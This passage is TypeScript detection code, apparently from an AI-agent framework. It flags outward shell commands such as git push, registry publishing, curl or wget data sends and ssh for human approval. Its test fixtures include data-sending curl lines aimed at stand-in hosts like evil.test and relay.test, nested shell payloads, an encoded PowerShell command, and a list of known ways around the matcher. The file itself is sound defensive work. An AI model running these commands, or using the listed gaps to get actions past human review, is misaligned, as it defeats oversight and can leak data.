import { looseSegments } from './hard-block.js'
import { splitShellCommand } from './split.js'

/**
 * Known outward commands: they send content to someone other than the owner or change remote state.
 *
 * Best effort, not a boundary. A session that opts in (see the outward checkpoint in
 * `@agnes/core/command-table`) holds a call whose command text trips one of these rules for a person.
 * Matching text cannot see what a word expands to, so a variable, a computed word, a function, a pipe
 * into a shell, a script or a language runtime gets past it; `OUTWARD_KNOWN_GAPS` lists those inputs.
 * This is code, not preset data: no preset, plugin, grant or model can remove a rule.
 */
export type OutwardRule = {
  id: string
  description: string
  /** Commands that must match. Checked when this module loads. */
  match: readonly string[]
  /** Look-alikes that must not match. Checked when this module loads. */
  notMatch: readonly string[]
  /** One command, wrapper prefixes already removed. */
  command: (words: readonly string[]) => boolean
}

const program = (word: string): string =>
  (word.replace(/^\\/, '').split(/[\\/]/).pop() ?? '').toLowerCase().replace(/\.(?:exe|cmd|com)$/, '')
const READ_METHODS = new Set(['GET', 'HEAD', 'OPTIONS'])
const unquote = (text: string) => text.replace(/^["']|["']$/g, '')
const writeMethod = (method: string) => !READ_METHODS.has(unquote(method).trim().toUpperCase())

/** Options before `--`, each with its value; operands, with every word after `--`, and their indexes. */
type Parsed = { options: Array<[name: string, value: string | undefined]>; operands: string[]; at: number[] }

/**
 * Whether the long option word `written` may stand for `full`: getopt_long, git's parse-options and
 * npm accept any prefix of a long option. Two letters after `--` are enough here even where the real
 * tool would call the prefix ambiguous: a false match is the safe side.
 */
const abbreviates = (written: string, full: string, shortest = 4) =>
  written === full ||
  (full.startsWith('--') &&
    written.startsWith('--') &&
    written.length >= shortest &&
    full.startsWith(written))

/**
 * Splits the words after the program. A `valued` option takes the next word, or the rest of its own
 * word when written `-Xvalue` or `--name=value`. A short cluster such as `-sX POST` gives each letter,
 * and the first valued letter takes the value. A prefix of a valued long option is given the next word
 * as its value, and that word is still read as an operand: it could be either.
 */
function parse(words: readonly string[], valued: readonly string[]): Parsed {
  const parsed: Parsed = { options: [], operands: [], at: [] }
  for (let i = 1; i < words.length; i++) {
    const word = words[i] as string
    if (word === '--') {
      for (let j = i + 1; j < words.length; j++) {
        parsed.operands.push(words[j] as string)
        parsed.at.push(j)
      }
      break
    }
    if (word.startsWith('--')) {
      const eq = word.indexOf('=')
      if (eq > 0) parsed.options.push([word.slice(0, eq), word.slice(eq + 1)])
      else if (valued.includes(word)) parsed.options.push([word, words[++i]])
      else
        parsed.options.push([word, valued.some((name) => abbreviates(word, name)) ? words[i + 1] : undefined])
    } else if (word.startsWith('-') && word.length > 1) {
      if (valued.includes(word)) {
        parsed.options.push([word, words[++i]])
        continue
      }
      for (let j = 1; j < word.length; j++) {
        const name = `-${word[j]}`
        if (valued.includes(name)) {
          parsed.options.push([name, j + 1 < word.length ? word.slice(j + 1) : words[++i]])
          break
        }
        parsed.options.push([name, undefined])
      }
    } else {
      parsed.operands.push(word)
      parsed.at.push(i)
    }
  }
  return parsed
}

/** Subcommands common enough that an option word before one is taken to need no value. */
const COMMON_SUBCOMMANDS = new Set([
  ...['status', 'log', 'diff', 'show', 'commit', 'add', 'fetch', 'pull', 'checkout', 'switch', 'branch'],
  ...['merge', 'rebase', 'reset', 'stash', 'tag', 'remote', 'clone', 'init', 'blame', 'grep', 'restore'],
  ...['worktree', 'submodule', 'bisect', 'reflog', 'clean', 'rm', 'mv', 'apply', 'am', 'cherry-pick'],
  ...['revert', 'describe', 'archive', 'help', 'version', 'run', 'run-script', 'test', 'install', 'i'],
  ...['ci', 'exec', 'x', 'view', 'info', 'ls', 'list', 'outdated', 'audit', 'pack', 'update', 'remove'],
  ...['uninstall', 'build', 'check', 'clippy', 'fmt', 'doc', 'bench', 'tree', 'new', 'search', 'images'],
  ...['ps', 'logs', 'inspect', 'compose', 'start', 'stop'],
])

/**
 * The operand lists the subcommand may start: the operands, then each shorter list obtained by taking
 * a leading operand as the value of the option word just before it. The option lists here are not
 * complete, so `cargo --config x=1 publish` must still find `publish`.
 */
function positions(words: readonly string[], parsed: Parsed): string[][] {
  const lists = [parsed.operands]
  for (let k = 0; k < parsed.operands.length; k++) {
    const at = parsed.at[k] as number
    const before = words[at - 1] ?? ''
    const option = at > 1 && /^-./.test(before) && before !== '--' && !before.includes('=')
    if (!option || COMMON_SUBCOMMANDS.has(parsed.operands[k] as string)) break
    lists.push(parsed.operands.slice(k + 1))
  }
  return lists
}

/** Whether an option exempting a command (`git config --get`) is given, by its exact name only. */
const has = (parsed: Parsed, names: readonly string[]) =>
  parsed.options.some(([name]) => names.includes(name))
/** Options that make a command outward, with their values: a prefix of a long option counts as it. */
const written = (parsed: Parsed, names: readonly string[]) =>
  parsed.options.filter(([name]) => names.some((full) => abbreviates(name, full)))
const valuesOf = (parsed: Parsed, names: readonly string[]) =>
  written(parsed, names).map(([, value]) => value ?? '')
const hasAny = (parsed: Parsed, names: readonly string[]) => written(parsed, names).length > 0

/**
 * A dry run the tool honours: `--dry-run`, or `-n` alone or in a cluster of the value-free letters
 * `flags`. The word must follow the program, an operand, or such a cluster: after any other option
 * word it may be that option's value (`git push -o --dry-run`). It is honoured only when no word
 * could cancel it: any prefix of `--no-dry-run` from `--no-d` on (git and npm read `--no-dry` as it),
 * a prefix of `--dry-run` given a value other than `--dry-run=true`, or one followed by `false`.
 */
function dryRun(words: readonly string[], flags?: string): boolean {
  const cluster = flags ? new RegExp(`^-[${flags}]+$`) : undefined
  let dry = false
  for (let i = 1; i < words.length && words[i] !== '--'; i++) {
    const word = words[i] as string
    const eq = word.indexOf('=')
    const name = eq > 0 ? word.slice(0, eq) : word
    if (abbreviates(name, '--no-dry-run', '--no-d'.length)) return false
    if (abbreviates(name, '--dry-run', '--d'.length)) {
      if (eq < 0 && NEGATING.test(words[i + 1] ?? '')) return false
      if (eq > 0) {
        if (!/^--dry-run=(?:true|1|yes|on)$/i.test(word)) return false
        dry = true
        continue
      }
    }
    const named = word === '--dry-run' || (cluster?.test(word) === true && word.includes('n'))
    const before = words[i - 1] as string
    if (named && (i === 1 || !before.startsWith('-') || cluster?.test(before) === true)) dry = true
  }
  return dry
}
/** A value that turns a boolean option off: `npm publish --dry-run false` publishes. */
const NEGATING = /^(?:false|0|no|off)$/i
const GIT_PUSH_FLAGS = 'fqvudn'
const RSYNC_FLAGS = 'avzrlptgoDhPHAXSxucWqiOJmELRbkKCn'

const METHOD_OVERRIDE = /^\s*x-(?:http-)?method(?:-override)?\s*:\s*(\S+)/i
const overridesMethod = (headers: readonly string[]) =>
  headers.some((header) => {
    const method = METHOD_OVERRIDE.exec(unquote(header))?.[1]
    return method !== undefined && writeMethod(method)
  })

/**
 * Whether a URL operand names this machine. Anything the WHATWG parser and curl might read
 * differently (user info, backslashes, globbing braces, whitespace) is not loopback.
 */
function loopback(operand: string): boolean {
  if (/[@\\\s{}]/.test(operand)) return false
  let url: URL
  try {
    url = new URL(/^[a-z][a-z\d+.-]*:\/\//i.test(operand) ? operand : `http://${operand}`)
  } catch {
    return false
  }
  const host = url.hostname.toLowerCase()
  return host === 'localhost' || host === '[::1]' || /^127\.\d+\.\d+\.\d+$/.test(host)
}

/** A request that only reaches this machine: every URL is loopback and nothing reroutes it. */
const loopbackOnly = (urls: readonly string[], parsed: Parsed, rerouting: readonly string[]) =>
  urls.length > 0 && urls.every(loopback) && !hasAny(parsed, rerouting)

const GIT_VALUED = [
  ...['-C', '-c', '--git-dir', '--work-tree', '--namespace', '--config-env', '--super-prefix'],
  '--attr-source',
]
const GIT_CONFIG_READS = ['--get', '--get-all', '--get-regexp', '--get-urlmatch', '--list', '-l']
const aliasSetting = (setting: string) => /^alias\./i.test(unquote(setting))

/** `gh` actions that only read, by command group; any other group or action asks. */
const GH_READS: Record<string, readonly string[]> = {
  pr: ['list', 'view', 'status', 'diff', 'checks', 'checkout'],
  issue: ['list', 'view', 'status'],
  run: ['list', 'view', 'watch', 'download'],
  workflow: ['list', 'view'],
  release: ['list', 'view', 'download'],
  repo: ['list', 'view', 'clone'],
  gist: ['list', 'view', 'clone'],
  label: ['list'],
  cache: ['list'],
  secret: ['list'],
  variable: ['list', 'get'],
  codespace: ['list', 'view'],
  org: ['list'],
  project: ['list', 'view', 'field-list', 'item-list'],
  ruleset: ['list', 'view', 'check'],
  extension: ['list', 'search'],
  alias: ['list'],
  'gpg-key': ['list'],
  'ssh-key': ['list'],
}
const GH_READ_GROUPS = new Set(['search', 'browse', 'help', 'version', 'completion', 'status', 'config'])
const GH_FIELDS = ['-f', '-F', '--field', '--raw-field', '--input']
const GH_VALUED = ['-R', '--repo', '-X', '--method', '-H', '--header', '--hostname', ...GH_FIELDS]

/** npm accepts any unambiguous prefix of a command; the number is the shortest unambiguous one. */
const NPM_WRITES: ReadonlyArray<[verb: string, shortest: number]> = [
  ['publish', 2],
  ['unpublish', 3],
  ['deprecate', 3],
  ['undeprecate', 3],
  ['dist-tag', 3],
  ['owner', 2],
  ['access', 2],
]
const NPM_ALIASES: Record<string, string> = { 'dist-tags': 'dist-tag', author: 'owner' }
/** Sub-actions of an npm write verb that only read. */
const NPM_READS = new Set(['ls', 'list', 'get'])
const npmVerb = (word: string) =>
  (Object.hasOwn(NPM_ALIASES, word) ? NPM_ALIASES[word] : undefined) ??
  NPM_WRITES.find(([verb, shortest]) => word.length >= shortest && verb.startsWith(word))?.[0]

/** Build options whose value can send the image to a registry (`-o type=registry`, `--set *.push=true`). */
const BUILD_OUTPUT = ['-o', '--output', '--set']
const DOCKER_VALUED = [
  ...['-H', '--host', '-c', '--context', '--config', '-l', '--log-level', '--builder'],
  ...['--tlscacert', '--tlscert', '--tlskey', ...BUILD_OUTPUT],
]
const PUBLISH_VALUED: Record<string, readonly string[]> = {
  npm: [
    ...['-w', '--workspace', '--registry', '--prefix', '-C', '--userconfig', '--cache', '--otp'],
    ...['--tag', '--access', '--loglevel'],
  ],
  cargo: ['--config', '-Z', '--color', '--manifest-path'],
  pnpm: ['--filter', '-F', '-C', '--dir', '--registry'],
  yarn: ['--cwd'],
  docker: DOCKER_VALUED,
  nerdctl: DOCKER_VALUED,
  podman: ['--connection', '--url', '--identity', '--root', '--runroot', ...BUILD_OUTPUT],
}
const registryOutput = (value: string) =>
  /\btype=registry\b/i.test(value) || /\bpush=(?!false\b)/i.test(value)
/** `compose push`, whatever the compose options before it; every other compose command reads or runs locally. */
const composePush = (operands: readonly string[]) => operands.includes('push')
function images([verb = '', action = '', ...rest]: readonly string[], parsed: Parsed): boolean {
  if (verb === 'push' || (['image', 'manifest'].includes(verb) && action === 'push')) return true
  if (verb === 'compose') return composePush([action, ...rest])
  if (verb === 'buildx' && action === 'imagetools' && rest[0] === 'create') return true
  const build =
    verb === 'build' ||
    (verb === 'buildx' && ['build', 'bake'].includes(action)) ||
    (verb === 'image' && action === 'build')
  return (
    build &&
    (written(parsed, ['--push']).some(([, value]) => value !== 'false') ||
      valuesOf(parsed, BUILD_OUTPUT).some(registryOutput))
  )
}
/** Whether the write is a `publish`, the one verb whose dry run sends nothing. */
function publishes(name: string, operands: readonly string[]): boolean {
  const rest = name === 'yarn' && operands[0] === 'workspace' ? operands.slice(2) : operands
  const verb = (name === 'yarn' && rest[0] === 'npm' ? rest[1] : rest[0]) ?? ''
  return (name === 'npm' ? npmVerb(verb) : verb) === 'publish'
}
/** Registry writes by tool, given the operands after the global options: the subcommand position. */
const PUBLISH_VERBS: Record<string, (operands: readonly string[], parsed: Parsed) => boolean> = {
  npm([verb = '', action = '']) {
    const write = npmVerb(verb)
    if (write === undefined) return false
    return !['dist-tag', 'owner', 'access'].includes(write) || !NPM_READS.has(action)
  },
  pnpm: ([verb]) => verb === 'publish',
  yarn(operands) {
    const rest = operands[0] === 'workspace' ? operands.slice(2) : operands
    return rest[0] === 'publish' || (rest[0] === 'npm' && rest[1] === 'publish')
  },
  bun: ([verb]) => verb === 'publish',
  cargo: ([verb = '']) => ['publish', 'yank', 'owner'].includes(verb),
  twine: ([verb = '']) => ['upload', 'register'].includes(verb),
  gem: ([verb = '']) => ['push', 'yank', 'owner'].includes(verb),
  uv: ([verb]) => verb === 'publish',
  poetry: ([verb]) => verb === 'publish',
  docker: images,
  podman: images,
  nerdctl: images,
  'docker-compose': composePush,
  'podman-compose': composePush,
}

const CURL_DATA = [
  '-d',
  '--data',
  '--data-raw',
  '--data-binary',
  '--data-urlencode',
  '--data-ascii',
  '--json',
  '-F',
  '--form',
  '--form-string',
  '-T',
  '--upload-file',
]
const CURL_REROUTE = [
  ...['-x', '--proxy', '--preproxy', '--resolve', '--connect-to', '--unix-socket', '--abstract-unix-socket'],
  ...['--socks4', '--socks4a', '--socks5', '--socks5-hostname'],
]
const CURL_VALUED = [
  ...CURL_DATA,
  ...CURL_REROUTE,
  ...['-X', '--request', '-H', '--header', '-K', '--config', '--url', '-o', '--output', '-u', '--user'],
  ...['-A', '--user-agent', '-e', '--referer', '-b', '--cookie', '-c', '--cookie-jar', '-m', '--max-time'],
  ...['-w', '--write-out', '-U', '--proxy-user', '-E', '--cert', '--key', '--cacert', '-r', '--range'],
  ...['-y', '-Y', '-z', '-C', '-D', '--dump-header', '--connect-timeout', '--retry', '--interface'],
  ...['--limit-rate', '-Q', '--quote', '--trace', '--trace-ascii', '--variable'],
]
const WGET_DATA = ['--post-data', '--post-file', '--body-data', '--body-file']
const WGET_REROUTE = ['-e', '--execute', '--config', '-i', '--input-file']
const WGET_VALUED = [
  ...WGET_DATA,
  ...WGET_REROUTE,
  ...['--method', '--header', '-O', '--output-document', '-o', '--output-file', '-U', '--user-agent'],
  ...['-P', '--directory-prefix', '-t', '--tries', '-T', '--timeout', '--user', '--password', '-Y'],
]

const SFTP_VALUED = ['-b', '-B', '-c', '-D', '-F', '-i', '-J', '-l', '-o', '-P', '-R', '-S', '-s', '-X']
const SSH_VALUED = ['-b', '-B', '-c', '-D', '-E', '-e', '-F', '-I', '-i', '-J', '-L', '-l', '-m', '-O']
const SSH_ALL_VALUED = [...SSH_VALUED, '-o', '-p', '-Q', '-R', '-S', '-W', '-w']
const SCP_VALUED = ['-c', '-D', '-F', '-i', '-J', '-l', '-o', '-P', '-S', '-X']
const RSYNC_VALUED = ['-e', '--rsh', '--rsync-path', '--exclude', '--include', '-f', '--filter', '-B', '-M']
/** `host:path`, `user@host:path`, `host::module`, or a URL; not `./a:b` or `/a:b`. */
const REMOTE_PATH = /^(?:[a-z]+:\/\/|[^/.:][^/:]*:)/

export const OUTWARD_COMMAND_RULES: readonly OutwardRule[] = [
  {
    id: 'git-push',
    description: 'pushing commits, sending patches, or defining a git alias',
    match: [
      'git push',
      'git push origin main',
      'git -C repo push',
      'cd repo && git push -u origin feature',
      'sudo git push',
      "bash -c 'git push --force'",
      '/usr/bin/git push',
      'GIT_SSH_COMMAND=ssh git push',
      'git send-email 0001.patch',
      'rtk git push',
      'rtk proxy git push',
      'mise exec -- git push',
      'mise exec node@24 -- git push',
      'time git push',
      'xargs -n 1 git push',
      'git push --dry-run --no-dry-run',
      'git push --dry-run=false',
      'git -calias.x=push x',
      'git config --global alias.st status',
      'git rebase -x "git push" main',
      'git submodule foreach --recursive git push',
      "bash -eo pipefail -c 'git push'",
      "fish -C true -c 'git push'",
      "fish --init-command 'git push' -c true",
      "bash --init f -c 'git push'",
      'git push -o --dry-run origin main',
      'git push --force --dry-run',
      'if true; then git push; fi',
      '! git push',
      '> out git push',
      'git --attr-source HEAD push',
      "git rebase --exe 'git push' main",
      'sudo --us root git push',
      "flock --comm 'git push' lock",
      'time --outp f git push',
      "bash --rcf f -c 'git push'",
      "env --split-s 'git push'",
      'git push --dry-run --no-dry',
      'git push --dry-run --no-dry-ru',
      'git push --dry-run --no-d',
      'git push --dry-run --dry=false',
    ],
    notMatch: [
      'git status',
      'git stash push',
      'git commit -m push',
      'echo git push',
      'git log --grep push',
      'git push -n',
      'git config --get alias.st',
      'git -c user.name=x commit -m y',
      "git rebase --exec 'make test' main",
      "git submodule foreach 'git status'",
      'git push -fn',
      "bash -c 'echo hi' 'git push'",
      'git push --dry-run',
      'git --no-pager log --grep push',
      'if true; then echo push; fi',
    ],
    command(words) {
      const name = program(words[0] ?? '')
      if (name === 'git-push') return !dryRun(words, GIT_PUSH_FLAGS)
      if (name === 'git-send-email') return !dryRun(words)
      if (name !== 'git') return false
      const parsed = parse(words, GIT_VALUED)
      if (valuesOf(parsed, ['-c', '--config-env']).some(aliasSetting)) return true
      return positions(words, parsed).some(([sub, action, ...rest]) => {
        // `send-email` has no short dry run: `-n` there is format-patch's `--numbered`.
        if (sub === 'push' || sub === 'send-email')
          return !dryRun(words, sub === 'push' ? GIT_PUSH_FLAGS : undefined)
        if ((sub === 'subtree' || sub === 'lfs') && action === 'push') return true
        return (
          sub === 'config' &&
          [action, ...rest].some((word) => aliasSetting(word ?? '')) &&
          !has(parsed, GIT_CONFIG_READS)
        )
      })
    },
  },
  {
    id: 'gh-write',
    description: 'a GitHub CLI command that is not a known read',
    match: [
      'gh pr create --fill',
      'gh pr merge 12 --squash',
      'gh pr comment 12 -b hi',
      'gh issue create -t x',
      'gh issue close 3',
      'gh release create v1',
      'gh repo create x --public',
      'gh -R o/r pr create',
      'gh api -X POST repos/o/r/issues',
      'gh api --method=DELETE repos/o/r',
      'gh api repos/o/r/issues -f title=x',
      'gh api graphql -F query=@q.graphql',
      'npx gh pr create',
      'pnpm exec gh pr create',
      'gh api -XPATCH repos/o/r',
      "gh api -X GET -H 'X-HTTP-Method: PUT' repos/o/r",
      'gh label clone o/r',
      'gh secret set X',
      'gh some-extension list',
    ],
    notMatch: [
      'gh pr list',
      'gh pr view 12',
      'gh issue list',
      'gh pr checks',
      'gh pr diff 3',
      'gh run watch',
      'gh api repos/o/r/pulls',
      'gh api -X GET search/issues -f q=x',
      'gh search prs x',
      'gh auth status',
      'gh --version',
      "gh api -H 'Accept: application/json' repos/o/r",
      'gh release download v1',
      'gh variable get X',
    ],
    command(words) {
      if (program(words[0] ?? '') !== 'gh') return false
      const parsed = parse(words, GH_VALUED)
      const [group, action] = parsed.operands
      if (group === undefined || GH_READ_GROUPS.has(group)) return false
      if (group === 'api') {
        if (overridesMethod(valuesOf(parsed, ['-H', '--header']))) return true
        const methods = valuesOf(parsed, ['-X', '--method'])
        return methods.length > 0 ? methods.some(writeMethod) : hasAny(parsed, GH_FIELDS)
      }
      if (group === 'auth') return !['status', 'token'].includes(action ?? '')
      const reads = Object.hasOwn(GH_READS, group) ? GH_READS[group] : undefined
      return action === undefined || !reads?.includes(action)
    },
  },
  {
    id: 'package-publish',
    description: 'publishing or changing a package, crate, gem or image in a registry',
    match: [
      'npm publish',
      'npm publish --access public',
      'pnpm publish -r',
      'yarn npm publish',
      'yarn publish',
      'cargo publish',
      'twine upload dist/*',
      'docker push org/image:1',
      'npm dist-tag add x@1 latest',
      'pnpm --filter x publish',
      'npm --registry https://r.test publish',
      'npm -w pkg publish',
      'yarn workspace pkg npm publish',
      'cargo +nightly publish',
      'docker image push org/image:1',
      'npm publi',
      'npm author add u x',
      'npm owner add u x',
      'docker build --push -t org/image .',
      'podman build --push -t org/image .',
      'npm publish --dry-run=false',
      'gem push x.gem',
      'npm owner add u pkg --dry-run',
      'npm --tag beta publish',
      'cargo -Z unstable publish',
      'docker --tlscacert ca push org/i',
      'npm publish --dry-run --no-dry',
      'cargo publish --dry-run --no-dry',
      'docker compose push',
      'docker compose -f a.yml push web',
      'docker-compose push',
      'podman compose push',
      'podman-compose push',
      'nerdctl compose push',
      'nerdctl push org/i',
      'docker buildx build --output type=registry .',
      'docker build -o type=image,push=true .',
      'docker buildx build --output=type=image,name=org/i,push=true .',
      'docker buildx bake --set *.output=type=registry',
      'docker buildx imagetools create -t org/i:1 org/i:0',
      'docker build --pus -t org/i .',
    ],
    notMatch: [
      'npm install',
      'npm run build',
      'pnpm test',
      'yarn add x',
      'docker pull x',
      'cargo build',
      'npm run publish',
      'npm dist-tag ls x',
      'npm access list packages',
      'cargo publish --dry-run',
      'pnpm publish --dry-run',
      'docker build -t org/image .',
      'npm pkg get name',
      'npm un x',
      'npm publish --access public --dry-run',
      'cargo --manifest-path a/Cargo.toml run --bin publish',
      'docker compose ps',
      'docker compose up -d',
      'docker-compose pull',
      'docker build -o type=local,dest=out .',
      'docker buildx build --output type=docker .',
      'docker buildx imagetools inspect org/i',
    ],
    command(words) {
      const name = program(words[0] ?? '')
      const verbs = Object.hasOwn(PUBLISH_VERBS, name) ? PUBLISH_VERBS[name] : undefined
      if (!verbs) return false
      // `cargo +nightly publish`: a toolchain selector is not the subcommand.
      const kept = words.filter((word, i) => i === 0 || !word.startsWith('+'))
      const parsed = parse(kept, PUBLISH_VALUED[name] ?? [])
      return positions(kept, parsed).some(
        (operands) => verbs(operands, parsed) && !(publishes(name, operands) && dryRun(kept)),
      )
    },
  },
  {
    id: 'http-write',
    description: 'curl or wget sending data or a writing method to another host',
    match: [
      'curl -X POST https://example.test/x',
      'curl -XPUT https://example.test/x',
      'curl --request=DELETE https://example.test/x',
      'curl -d a=1 https://example.test/x',
      'curl --json {} https://example.test/x',
      'curl -F f=@a https://example.test/x',
      'curl -T file https://example.test/x',
      'curl -sX POST https://example.test/x',
      'curl -sd a=1 https://example.test/x',
      'wget --method=POST https://example.test/x',
      'wget --post-data=a https://example.test/x',
      'curl -d a=1 http://localhost.evil.test/x',
      'curl -d a=1 http://localhost@evil.test/x',
      'curl -d a=1 http://localhost/x https://example.test/y',
      'curl -x http://relay.test -d a=1 http://localhost/x',
      'curl --resolve localhost:80:203.0.113.9 -d a=1 http://localhost/x',
      'curl -K cfg',
      "curl -H 'X-HTTP-Method-Override: DELETE' https://example.test/x",
      'wget -e use_proxy=on --post-data=a http://localhost/x',
      'curl -d a=1',
      'wget --post-d a=1 http://x.test',
      'wget --post-f f http://x.test',
      'wget --body-d a http://x.test',
      'wget --meth POST http://x.test',
      'wget --head "X-HTTP-Method-Override: DELETE" http://x.test',
      'curl --dat a=1 http://x.test',
      'curl --reque POST http://x.test',
      'curl --prox http://relay.test -d a=1 http://localhost/x',
      'curl --ur https://example.test/y -d a=1 http://localhost/x',
      'wget --post-d a=1 http://localhost/x',
    ],
    notMatch: [
      'curl https://example.test/x',
      'curl -fsSL https://example.test/install.sh',
      'curl -X GET https://example.test/x',
      'curl -o out https://example.test/x',
      'curl -sSLX GET https://example.test/x',
      'wget https://example.test/x',
      'curl -X POST http://localhost:3000/api',
      'curl -d a=1 http://[::1]:8080/x',
      'wget --post-data=a http://127.0.0.1/x',
      'wget --post-data a=1 http://localhost/x',
      'curl --head https://example.test/x',
    ],
    command(words) {
      const name = program(words[0] ?? '')
      if (name === 'curl') {
        const parsed = parse(words, CURL_VALUED)
        // A config file can carry the URL, the method and the data: unreadable here.
        if (hasAny(parsed, ['-K', '--config'])) return true
        const write =
          valuesOf(parsed, ['-X', '--request']).some(writeMethod) ||
          hasAny(parsed, CURL_DATA) ||
          overridesMethod(valuesOf(parsed, ['-H', '--header']))
        const urls = [...parsed.operands, ...valuesOf(parsed, ['--url'])]
        return write && !loopbackOnly(urls, parsed, CURL_REROUTE)
      }
      if (name === 'wget') {
        const parsed = parse(words, WGET_VALUED)
        const write =
          valuesOf(parsed, ['--method']).some(writeMethod) ||
          hasAny(parsed, WGET_DATA) ||
          overridesMethod(valuesOf(parsed, ['--header']))
        return write && !loopbackOnly(parsed.operands, parsed, WGET_REROUTE)
      }
      return false
    },
  },
  {
    id: 'remote-shell',
    description: 'ssh, scp, sftp, or rsync to a remote host',
    match: [
      'ssh host',
      'ssh -i key user@host ls',
      'scp a host:b',
      'sftp host',
      'rsync -av ./dist host:/srv',
      'rsync a rsync://host/m',
      'scp -P 2222 a user@host:/srv',
      'rsync -av --dry-run --no-dry-run ./dist host:/srv',
      'rsync --log-file --dry-run ./x host:/y',
      'rsync -av --dry-run --no-dry ./d h:/s',
    ],
    notMatch: [
      'rsync -av ./a ./b',
      'ssh-keygen -t ed25519',
      'echo ssh host',
      'ssh -V',
      'scp a b',
      'scp -i key ./a:b /tmp/c',
      'rsync -avn ./dist host:/srv',
      'rsync --dry-run ./dist host:/srv',
      'rsync -av --dry-run ./a host:/b',
    ],
    command(words) {
      const name = program(words[0] ?? '')
      if (name === 'ssh' || name === 'sftp')
        return parse(words, name === 'ssh' ? SSH_ALL_VALUED : SFTP_VALUED).operands.length > 0
      if (name === 'scp') return parse(words, SCP_VALUED).operands.some((word) => REMOTE_PATH.test(word))
      if (name !== 'rsync') return false
      const parsed = parse(words, RSYNC_VALUED)
      return parsed.operands.some((word) => REMOTE_PATH.test(word)) && !dryRun(words, RSYNC_FLAGS)
    },
  },
]

/**
 * The hit for text the rules stop reading: shell payloads nested past `MAX_DEPTH`, or more commands
 * than `MAX_STEPS`. Unread is not harmless, so it is held like a match.
 */
export const OUTWARD_NESTING = {
  id: 'nesting',
  description: 'a command nested deeper than the rules read',
  match: [`bash -c "bash -c 'bash -c \\"bash -c ls\\"'"`, `eval "eval 'eval \\"eval ls\\"'"`],
} as const

/**
 * Inputs the rules do not see, kept here so the tests and the security guide name the same list.
 * Each is a deliberate gap: closing it would take a shell interpreter, not a matcher.
 */
export const OUTWARD_KNOWN_GAPS: ReadonlyArray<{ kind: string; input: string }> = [
  { kind: 'variable indirection', input: 'x=push; git $x' },
  { kind: 'variable indirection', input: 'G=git; $G push' },
  { kind: 'command substitution', input: 'git $(printf push)' },
  { kind: 'command substitution', input: 'bash -c "$(echo git push)"' },
  { kind: 'ANSI-C quoting', input: "git $'push'" },
  { kind: 'function definition', input: 'f() { git "$@"; }; f push' },
  { kind: 'pipe into a shell', input: 'echo git push | sh' },
  { kind: 'pipe into a shell', input: "sh <<< 'git push'" },
  {
    kind: 'configuration from the environment',
    input: 'GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=alias.p GIT_CONFIG_VALUE_0=push git p',
  },
  { kind: 'alias defined in an earlier call', input: 'git ship' },
  {
    kind: 'proxy from the environment',
    input: 'http_proxy=http://relay.test curl -d a=1 http://localhost/x',
  },
  { kind: 'encoded payload', input: 'pwsh -EncodedCommand ZwBpAHQAIABwAHUAcwBoAA==' },
  { kind: 'script or language runtime', input: 'node scripts/release.js' },
  { kind: 'script or language runtime', input: 'python -c "import urllib.request"' },
  { kind: 'script or language runtime', input: 'make release' },
  { kind: 'unlisted command prefix', input: 'caffeinate git push' },
  { kind: 'unknown option whose value is a common subcommand', input: 'npm --heading test publish' },
  { kind: 'configuration file', input: 'docker buildx bake' },
]

const MAX_DEPTH = 3
const MAX_STEPS = 256

/** A command a wrapper runs: its words, or shell text to parse again one level deeper. */
type Inner = readonly string[] | string

type Wrapper = {
  /** The subcommand that makes the program a launcher (`npm exec`, `uv run`). */
  sub?: readonly string[]
  valued?: readonly string[]
  /** Options whose value is shell text (`su -c 'cmd'`). */
  text?: readonly string[]
  /** Operands between the options and the command (`timeout 30`, `flock file`). */
  skip?: number
  /** Words that end the command (`parallel ... :::`). */
  until?: readonly string[]
  /** `NAME=value` words among the options (`env A=1 cmd`). */
  assignments?: boolean
}

/** Programs that run a command given after their own options. */
const WRAPPERS: Record<string, Wrapper> = {
  sudo: {
    valued: ['-u', '-g', '-h', '-p', '-C', '-r', '-t', '-U', '-D', '-R', '--user', '--group', '--chdir'],
  },
  doas: { valued: ['-u', '-C'] },
  env: { valued: ['-u', '-C', '--unset', '--chdir'], assignments: true },
  command: {},
  exec: { valued: ['-a'] },
  nohup: {},
  nice: { valued: ['-n', '--adjustment'] },
  timeout: { valued: ['-s', '-k', '--signal', '--kill-after'], skip: 1 },
  time: { valued: ['-o', '-f', '--output', '--format'] },
  busybox: {},
  setsid: {},
  stdbuf: { valued: ['-i', '-o', '-e'] },
  flock: { valued: ['-w', '--timeout', '-E', '--conflict-exit-code'], text: ['-c', '--command'], skip: 1 },
  xcrun: { valued: ['-sdk', '--sdk', '--toolchain'] },
  watch: { valued: ['-n', '--interval'] },
  parallel: { valued: ['-j', '--jobs', '-S', '--sshlogin'], until: [':::', '::::', ':::+', '::::+'] },
  script: {
    valued: ['-t', '-T', '-I', '-O', '-B', '-E', '--log-in', '--log-out', '--log-io', '--log-timing'],
    text: ['-c', '--command'],
    skip: 1,
  },
  su: {
    valued: ['-s', '--shell', '-g', '-G', '--group', '-w'],
    text: ['-c', '--command', '--session-command'],
  },
  xargs: { valued: ['-I', '-n', '-P', '-L', '-d', '-s', '-E', '-a'] },
  npx: { valued: ['-p', '--package'], text: ['-c', '--call'] },
  bunx: { valued: ['-p', '--package'] },
  uvx: { valued: ['--from', '--with', '--python', '-p'] },
  mise: {
    sub: ['exec', 'x'],
    valued: ['-C', '--cd', '-E', '--env', '-j', '--jobs'],
    text: ['-c', '--command'],
  },
  pnpm: { sub: ['exec', 'dlx'], valued: ['--filter', '-F', '-C', '--dir', '--package'] },
  yarn: { sub: ['exec', 'dlx'], valued: ['-p', '--package'] },
  bun: { sub: ['x'] },
  npm: {
    sub: ['exec', 'x'],
    valued: ['-w', '--workspace', '--prefix', '-p', '--package'],
    text: ['-c', '--call'],
  },
  uv: {
    sub: ['run'],
    valued: ['--with', '--python', '-p', '--project', '--directory', '--package', '--from'],
  },
  poetry: { sub: ['run'], valued: ['-C', '--directory', '-P', '--project'] },
  bundle: { sub: ['exec'] },
  direnv: { sub: ['exec'], skip: 1 },
  op: { sub: ['run'], valued: ['--env-file', '--account'] },
}

/**
 * Shell text in one of the options `names` at `words[i]`: `-c text`, `-ctext`, a short cluster that
 * ends in the letter (`-qc text`), or `--name=text`, a long name possibly abbreviated (`--exe`).
 * `used` is how many words it took.
 */
function textOption(
  words: readonly string[],
  i: number,
  names: readonly string[],
): { text: string; used: number } | undefined {
  const word = words[i] as string
  const next = words[i + 1]
  for (const name of names) {
